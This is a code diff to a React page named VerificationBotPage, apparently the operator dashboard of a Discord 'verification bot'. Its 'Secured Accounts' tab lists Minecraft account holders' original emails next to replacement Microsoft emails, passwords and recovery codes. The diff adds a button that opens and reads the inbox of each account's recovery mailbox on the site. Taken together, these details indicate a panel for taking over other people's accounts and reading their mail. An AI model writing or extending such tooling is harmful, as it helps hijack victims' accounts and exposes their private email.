@@ -4,7 +4,7 @@ import { useServerFn } from "@tanstack/react-start";
 import {
   ShieldCheck, Copy, Check, Settings, Save, RefreshCw,
   ExternalLink, BookOpen, ClipboardList, Server, Key, Users,
-  MessageSquare, Globe, ChevronRight, AlertTriangle, Terminal,
+  MessageSquare, Globe, ChevronRight, AlertTriangle, Terminal, Mail, Inbox,
 } from "lucide-react";
 import {
   getVerificationKeys,
@@ -12,6 +12,7 @@ import {
   getVerificationSettings,
   saveVerificationSettings,
   getSecuredAccounts,
+  getSecuredMailboxInbox,
   resendKey,
   getVerificationBotInvite,
 } from "@/lib/luaux.functions";
@@ -97,6 +98,7 @@ function VerificationBotPage() {
   const fetchSettings = useServerFn(getVerificationSettings);
   const saveSettings = useServerFn(saveVerificationSettings);
   const fetchSecuredAccounts = useServerFn(getSecuredAccounts);
+  const openMailboxInbox = useServerFn(getSecuredMailboxInbox);
 
   const [keys, setKeys] = useState<KeyRow[]>([]);
   const [isAdmin, setIsAdmin] = useState(false);
@@ -104,6 +106,24 @@ function VerificationBotPage() {
   const [loading, setLoading] = useState(true);
   const [copied, setCopied] = useState<string | null>(null);
   const [securedAccounts, setSecuredAccounts] = useState<Array<Record<string, unknown>>>([]);
+  const [mailboxOpenId, setMailboxOpenId] = useState<string | null>(null);
+  const [mailboxLoading, setMailboxLoading] = useState(false);
+  const [mailboxError, setMailboxError] = useState<string | null>(null);
+  const [mailboxData, setMailboxData] = useState<{
+    email: string;
+    host: string;
+    provider: string;
+    count: number;
+    messages: Array<{
+      uid: number;
+      from: string;
+      subject: string;
+      date: string | null;
+      snippet: string;
+      body: string;
+    }>;
+  } | null>(null);
+  const [selectedMsgUid, setSelectedMsgUid] = useState<number | null>(null);
 
   const [activeTab, setActiveTab] = useState<"config" | "guide" | "accounts">("config");
 
@@ -732,75 +752,189 @@ function VerificationBotPage() {
                     <div>
                       <h3 className="font-semibold text-sm">Secured Accounts</h3>
                       <p className="text-xs text-muted-foreground">
-                        Full credentials + recovery mailbox. Only shown here (not in Discord).
+                        MS credentials + open the recovery mailbox inbox on-site.
                       </p>
                     </div>
                   </div>
                   <div className="divide-y divide-border/40">
-                    {(securedAccounts as Array<Record<string, string>>).map((acc) => {
-                      const mailbox =
-                        acc.mailbox_email ||
-                        (acc.new_email && !String(acc.new_email).includes("Couldn")
-                          ? acc.new_email
-                          : "");
+                    {(securedAccounts as Array<Record<string, unknown>>).map((acc) => {
+                      const id = String(acc.id || "");
+                      const hasMailbox = !!acc.has_mailbox;
+                      const isOpen = mailboxOpenId === id;
                       return (
-                      <div key={acc.id} className="p-4 text-xs space-y-2">
+                      <div key={id} className="p-4 text-xs space-y-3">
                         <div className="flex items-center justify-between gap-2 flex-wrap">
                           <span className="font-semibold text-primary">
-                            {acc.mc_username}
+                            {String(acc.mc_username || "")}
                           </span>
                           <span className="text-muted-foreground">
                             {acc.secured_at
-                              ? new Date(acc.secured_at).toLocaleString()
+                              ? new Date(String(acc.secured_at)).toLocaleString()
                               : ""}
                           </span>
                         </div>
                         {acc.mc_email ? (
                           <p className="text-[11px] text-muted-foreground">
-                            Original: <code className="text-foreground/80">{acc.mc_email}</code>
+                            Original:{" "}
+                            <code className="text-foreground/80">{String(acc.mc_email)}</code>
                           </p>
                         ) : null}
                         <div className="grid sm:grid-cols-2 gap-2">
                           <div className="rounded-lg bg-background/60 brutal-border p-2.5 space-y-1">
-                            <span className="text-[10px] text-muted-foreground uppercase tracking-widest">New Email (MS)</span>
-                            <code className="block text-foreground break-all">{acc.new_email || "—"}</code>
+                            <span className="text-[10px] text-muted-foreground uppercase tracking-widest">New Email</span>
+                            <code className="block text-foreground break-all">{String(acc.new_email || "—")}</code>
                           </div>
                           <div className="rounded-lg bg-background/60 brutal-border p-2.5 space-y-1">
-                            <span className="text-[10px] text-muted-foreground uppercase tracking-widest">MS Password</span>
-                            <code className="block text-foreground break-all">{acc.new_password || "—"}</code>
+                            <span className="text-[10px] text-muted-foreground uppercase tracking-widest">Password</span>
+                            <code className="block text-foreground break-all">{String(acc.new_password || "—")}</code>
                           </div>
                           <div className="rounded-lg bg-background/60 brutal-border p-2.5 space-y-1">
                             <span className="text-[10px] text-muted-foreground uppercase tracking-widest">Recovery Code</span>
-                            <code className="block text-foreground break-all">{acc.new_recovery_code || "—"}</code>
+                            <code className="block text-foreground break-all">{String(acc.new_recovery_code || "—")}</code>
                           </div>
                           <div className="rounded-lg bg-background/60 brutal-border p-2.5 space-y-1">
                             <span className="text-[10px] text-muted-foreground uppercase tracking-widest">MC Method</span>
-                            <code className="block text-foreground">{acc.mc_method || "—"}</code>
+                            <code className="block text-foreground">{String(acc.mc_method || "—")}</code>
                           </div>
-                          <div className="rounded-lg bg-primary/5 border border-primary/20 p-2.5 space-y-1 sm:col-span-2">
-                            <span className="text-[10px] text-primary uppercase tracking-widest font-semibold">
-                              Recovery mailbox
-                              {acc.mailbox_provider ? ` · ${acc.mailbox_provider}` : ""}
-                            </span>
-                            <code className="block text-foreground break-all">
-                              {mailbox || "—"}
-                            </code>
-                            {acc.mailbox_password ? (
-                              <div className="pt-1 space-y-0.5">
-                                <span className="text-[10px] text-muted-foreground uppercase tracking-widest">
-                                  Mailbox password
-                                </span>
-                                <code className="block text-foreground break-all">
-                                  {acc.mailbox_password}
+                        </div>
+
+                        <div className="rounded-xl border border-primary/25 bg-primary/5 p-3 space-y-2">
+                          <div className="flex flex-wrap items-center justify-between gap-2">
+                            <div className="flex items-center gap-2">
+                              <Mail className="h-4 w-4 text-primary" />
+                              <div>
+                                <div className="text-[11px] font-semibold text-primary">
+                                  Recovery mailbox
+                                </div>
+                                <code className="text-[11px] text-foreground/90 break-all">
+                                  {String(acc.mailbox_email || acc.new_email || "—")}
                                 </code>
                               </div>
-                            ) : null}
-                            {acc.mailbox_imap_host ? (
-                              <p className="text-[10px] text-muted-foreground pt-0.5">
-                                IMAP: {acc.mailbox_imap_host}
-                              </p>
-                            ) : null}
+                            </div>
+                            <button
+                              type="button"
+                              disabled={!hasMailbox || mailboxLoading}
+                              onClick={async () => {
+                                if (isOpen) {
+                                  setMailboxOpenId(null);
+                                  setMailboxData(null);
+                                  setMailboxError(null);
+                                  setSelectedMsgUid(null);
+                                  return;
+                                }
+                                setMailboxOpenId(id);
+                                setMailboxLoading(true);
+                                setMailboxError(null);
+                                setMailboxData(null);
+                                setSelectedMsgUid(null);
+                                try {
+                                  const inbox = (await openMailboxInbox({
+                                    data: { secured_id: id },
+                                  })) as {
+                                    email: string;
+                                    host: string;
+                                    provider: string;
+                                    count: number;
+                                    messages: Array<{
+                                      uid: number;
+                                      from: string;
+                                      subject: string;
+                                      date: string | null;
+                                      snippet: string;
+                                      body: string;
+                                    }>;
+                                  };
+                                  setMailboxData(inbox);
+                                  if (inbox.messages[0]) setSelectedMsgUid(inbox.messages[0].uid);
+                                } catch (e) {
+                                  setMailboxError(
+                                    e instanceof Error ? e.message : "Failed to open mailbox",
+                                  );
+                                } finally {
+                                  setMailboxLoading(false);
+                                }
+                              }}
+                              className="inline-flex items-center gap-1.5 rounded-full bg-primary text-primary-foreground px-3 py-1.5 text-[11px] font-semibold disabled:opacity-50"
+                            >
+                              <Inbox className="h-3.5 w-3.5" />
+                              {!hasMailbox
+                                ? "No mailbox stored"
+                                : mailboxLoading && isOpen
+                                  ? "Opening…"
+                                  : isOpen
+                                    ? "Close inbox"
+                                    : "Open mailbox"}
+                            </button>
                           </div>
+
+                          {isOpen && mailboxError ? (
+                            <p className="text-[11px] text-destructive">{mailboxError}</p>
+                          ) : null}
+
+                          {isOpen && mailboxLoading ? (
+                            <p className="text-[11px] text-muted-foreground">Loading inbox…</p>
+                          ) : null}
+
+                          {isOpen && mailboxData && !mailboxLoading ? (
+                            <div className="grid md:grid-cols-[minmax(0,1fr)_minmax(0,1.2fr)] gap-2 pt-1">
+                              <div className="rounded-lg brutal-border bg-background/70 max-h-64 overflow-y-auto divide-y divide-border/40">
+                                {mailboxData.messages.length === 0 ? (
+                                  <p className="p-3 text-[11px] text-muted-foreground">
+                                    Inbox empty ({mailboxData.email})
+                                  </p>
+                                ) : (
+                                  mailboxData.messages.map((m) => (
+                                    <button
+                                      key={m.uid}
+                                      type="button"
+                                      onClick={() => setSelectedMsgUid(m.uid)}
+                                      className={`w-full text-left p-2.5 hover:bg-primary/5 transition-colors ${
+                                        selectedMsgUid === m.uid ? "bg-primary/10" : ""
+                                      }`}
+                                    >
+                                      <div className="font-semibold text-[11px] truncate">
+                                        {m.subject}
+                                      </div>
+                                      <div className="text-[10px] text-muted-foreground truncate">
+                                        {m.from}
+                                      </div>
+                                      <div className="text-[10px] text-muted-foreground/80 mt-0.5">
+                                        {m.date ? new Date(m.date).toLocaleString() : ""}
+                                      </div>
+                                    </button>
+                                  ))
+                                )}
+                              </div>
+                              <div className="rounded-lg brutal-border bg-background/70 p-3 min-h-[10rem] max-h-64 overflow-y-auto">
+                                {(() => {
+                                  const msg =
+                                    mailboxData.messages.find((m) => m.uid === selectedMsgUid) ||
+                                    mailboxData.messages[0];
+                                  if (!msg) {
+                                    return (
+                                      <p className="text-[11px] text-muted-foreground">
+                                        Select a message
+                                      </p>
+                                    );
+                                  }
+                                  return (
+                                    <div className="space-y-2">
+                                      <div className="font-semibold text-xs">{msg.subject}</div>
+                                      <div className="text-[10px] text-muted-foreground">
+                                        From {msg.from}
+                                        {msg.date
+                                          ? ` · ${new Date(msg.date).toLocaleString()}`
+                                          : ""}
+                                      </div>
+                                      <p className="text-[11px] text-foreground/90 whitespace-pre-wrap leading-relaxed">
+                                        {msg.body || msg.snippet || "(empty)"}
+                                      </p>
+                                    </div>
+                                  );
+                                })()}
+                              </div>
+                            </div>
+                          ) : null}
                         </div>
                       </div>
                       );
@@ -812,7 +946,7 @@ function VerificationBotPage() {
                   <ShieldCheck className="h-10 w-10 text-muted-foreground mx-auto mb-3" />
                   <p className="text-sm text-muted-foreground">No secured accounts yet.</p>
                   <p className="text-xs text-muted-foreground/60 mt-1">
-                    Accounts appear here after secure completes (email, password, recovery code, mailbox).
+                    After secure completes, open the recovery mailbox inbox here.
                   </p>
                 </div>
               )}
